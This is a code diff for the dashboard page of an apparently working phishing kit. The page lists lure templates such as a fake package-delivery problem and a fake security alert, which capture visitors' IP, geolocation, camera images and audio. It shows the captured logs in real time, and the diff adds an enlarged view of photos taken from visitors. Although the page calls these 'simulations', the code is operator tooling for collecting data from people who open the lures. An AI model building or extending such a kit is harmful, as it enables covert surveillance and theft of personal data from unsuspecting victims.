@@ -1,17 +1,17 @@
 
 "use client";
-import { useEffect, useRef } from 'react';
+import { useEffect, useRef, useState } from 'react'; // Added useState
 import { useLogs } from '@/contexts/LogContext';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
-import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Truck, Trophy, ImagePlus } from 'lucide-react';
+import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle, ExternalLink, Truck, Trophy, ImagePlus, Sparkles, Lock, ShieldAlert } from 'lucide-react'; // Added Sparkles, Lock, ShieldAlert
 import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import Image from 'next/image';
 import { useToast } from '@/hooks/use-toast';
-import type { ToastActionElement } from '@/components/ui/toast'; 
-import { ToastAction } from '@/components/ui/toast'; 
+import type { ToastActionElement } from '@/components/ui/toast';
+import { ToastAction } from '@/components/ui/toast';
 
 
 const phishingCategories = [
@@ -20,9 +20,9 @@ const phishingCategories = [
     description: 'Templates designed to capture IP address and attempt geolocation.',
     Icon: MapPin,
     links: [
-      { id: 'package-delivery-issue', name: 'Template: Package Delivery Issue', url: '/phishing/location/package-delivery-issue', Icon: Truck },
-      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert', Icon: AlertTriangle },
-      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock', Icon: MapPin },
+      { id: 'package-delivery-issue', name: 'Template: Package Delivery Issue', url: '/phishing/location/package-delivery-issue', Icon: Truck, description: "Simulates a package delivery problem requiring address verification." },
+      { id: 'security-alert', name: 'Template: Security Alert', url: '/phishing/location/security-alert', Icon: ShieldAlert },
+      { id: 'content-unlock', name: 'Template: Content Unlock', url: '/phishing/location/content-unlock', Icon: Lock },
     ],
   },
   {
@@ -52,12 +52,13 @@ export default function DashboardPage() {
   const { toast } = useToast();
   const previousLatestLogIdRef = useRef<string | null>(null);
   const isInitialLoadRef = useRef(true);
+  const [expandedImageUrl, setExpandedImageUrl] = useState<string | null>(null);
 
   useEffect(() => {
-    if (isLoading) return; 
+    if (isLoading) return;
 
     if (logs.length === 0) {
-      previousLatestLogIdRef.current = null; 
+      previousLatestLogIdRef.current = null;
       if(isInitialLoadRef.current) isInitialLoadRef.current = false;
       return;
     }
@@ -67,7 +68,7 @@ export default function DashboardPage() {
     if (isInitialLoadRef.current) {
       previousLatestLogIdRef.current = currentLatestLogId;
       isInitialLoadRef.current = false;
-      return; 
+      return;
     }
 
     if (currentLatestLogId !== previousLatestLogIdRef.current) {
@@ -103,7 +104,7 @@ export default function DashboardPage() {
         toastTitle = "Page Visit Detected!";
         toastDescription = `Page: ${newLog.data.message?.split(': ')[1] || 'Unknown page'}, IP: ${newLog.ip}`;
       }
-      
+
       toast({
         title: toastTitle,
         description: toastDescription,
@@ -120,12 +121,13 @@ export default function DashboardPage() {
       const camData = data as CameraData;
       return (
         <div className="mt-2">
-          <Image 
-            src={camData.imageUrl} 
-            alt="Captured image" 
-            width={160} 
-            height={120} 
-            className="rounded-md border object-contain" 
+          <Image
+            src={camData.imageUrl}
+            alt="Captured image thumbnail"
+            width={160}
+            height={120}
+            className="rounded-md border object-contain cursor-pointer hover:opacity-80 transition-opacity"
+            onClick={() => setExpandedImageUrl(camData.imageUrl)}
           />
           <details className="text-xs mt-1">
             <summary className="cursor-pointer text-muted-foreground hover:text-foreground">Show Base64 Data</summary>
@@ -142,65 +144,85 @@ export default function DashboardPage() {
   };
 
   return (
-    <div className="space-y-10"> {/* Increased spacing */}
-      <Card className="shadow-lg">
-        <CardHeader>
-          <CardTitle className="text-2xl flex items-center">
-            <ListChecks className="mr-3 h-7 w-7 text-primary" />
-            Captured Data Logs
-          </CardTitle>
-          <CardDescription>
-            View all data captured from phishing page interactions. This data updates in real-time.
-          </CardDescription>
-        </CardHeader>
-        <CardContent className="space-y-4">
-          {isLoading ? (
-            <p>Loading logs...</p>
-          ) : logs.length === 0 ? (
-            <div className="text-center py-8 text-muted-foreground">
-              <AlertTriangle className="mx-auto h-12 w-12 mb-2" />
-              <p className="text-lg">No logs captured yet.</p>
-              <p>Interact with the phishing templates to see data here.</p>
-            </div>
-          ) : (
-            <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
-              {logs.map(log => (
-                <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
-                  <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
-                  <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
-                  <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
-                  <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
-                  <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
-                  <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
-                </div>
-              ))}
-            </ScrollArea>
-          )}
-          <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}>
-            <Trash2 className="mr-2 h-4 w-4" /> Delete All Logs
-          </Button>
-        </CardContent>
-      </Card>
+    <>
+      <div className="space-y-10">
+        <Card className="shadow-lg">
+          <CardHeader>
+            <CardTitle className="text-2xl flex items-center">
+              <ListChecks className="mr-3 h-7 w-7 text-primary" />
+              Captured Data Logs
+            </CardTitle>
+            <CardDescription>
+              View all data captured from phishing page interactions. This data updates in real-time.
+            </CardDescription>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            {isLoading ? (
+              <p>Loading logs...</p>
+            ) : logs.length === 0 ? (
+              <div className="text-center py-8 text-muted-foreground">
+                <AlertTriangle className="mx-auto h-12 w-12 mb-2" />
+                <p className="text-lg">No logs captured yet.</p>
+                <p>Interact with the phishing templates to see data here.</p>
+              </div>
+            ) : (
+              <ScrollArea className="h-[400px] w-full rounded-md border p-4 bg-secondary/30">
+                {logs.map(log => (
+                  <div key={log.id} className="mb-4 p-3 rounded-md bg-card shadow-sm border">
+                    <p className="font-semibold text-sm text-primary">Log ID: <span className="font-mono text-xs">{log.id}</span></p>
+                    <p className="text-xs text-muted-foreground">Timestamp: {new Date(log.timestamp).toLocaleString()}</p>
+                    <p className="text-xs text-muted-foreground">Type: <span className="font-medium capitalize">{log.type}</span></p>
+                    <p className="text-xs text-muted-foreground">IP: {log.ip}</p>
+                    <p className="text-xs text-muted-foreground">User Agent: {log.userAgent}</p>
+                    <div className="mt-1 text-sm">Data: {formatLogData(log.data, log.type)}</div>
+                  </div>
+                ))}
+              </ScrollArea>
+            )}
+            <Button onClick={clearLogs} variant="destructive" disabled={logs.length === 0}>
+              <Trash2 className="mr-2 h-4 w-4" /> Delete All Logs
+            </Button>
+          </CardContent>
+        </Card>
 
-      <Card className="shadow-lg">
-        <CardHeader>
-          <CardTitle className="text-2xl">Phishing Page Templates</CardTitle>
-          <CardDescription>
-            Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.
-          </CardDescription>
-        </CardHeader>
-        <CardContent className="grid gap-6 md:grid-cols-1 lg:grid-cols-3">
-          {phishingCategories.map((category) => (
-            <PhishingLinkCard
-              key={category.title}
-              title={category.title}
-              description={category.description}
-              Icon={category.Icon}
-              links={category.links.map(link => ({...link, Icon: link.Icon || category.Icon}))}
-            />
-          ))}
-        </CardContent>
-      </Card>
-    </div>
+        <Card className="shadow-lg">
+          <CardHeader>
+            <CardTitle className="text-2xl">Phishing Page Templates</CardTitle>
+            <CardDescription>
+              Use these links to simulate phishing attempts and observe data capture. Each link opens in a new tab.
+            </CardDescription>
+          </CardHeader>
+          <CardContent className="grid gap-6 md:grid-cols-1 lg:grid-cols-3">
+            {phishingCategories.map((category) => (
+              <PhishingLinkCard
+                key={category.title}
+                title={category.title}
+                description={category.description}
+                Icon={category.Icon}
+                links={category.links.map(link => ({...link, Icon: link.Icon || category.Icon}))}
+              />
+            ))}
+          </CardContent>
+        </Card>
+      </div>
+
+      {expandedImageUrl && (
+        <div
+          className="fixed inset-0 z-[101] flex items-center justify-center bg-black/80 p-4 cursor-zoom-out"
+          onClick={() => setExpandedImageUrl(null)} 
+        >
+          <Image
+            src={expandedImageUrl}
+            alt="Expanded captured image"
+            width={0} 
+            height={0}
+            sizes="100vw"
+            style={{ width: 'auto', height: 'auto' }} // Intrinsic size based on content
+            className="max-w-[90vw] max-h-[90vh] object-contain rounded-lg shadow-xl bg-white p-1"
+            onClick={(e) => e.stopPropagation()} // Prevent backdrop click when clicking image if needed, but here combined for simplicity
+          />
+        </div>
+      )}
+    </>
   );
 }
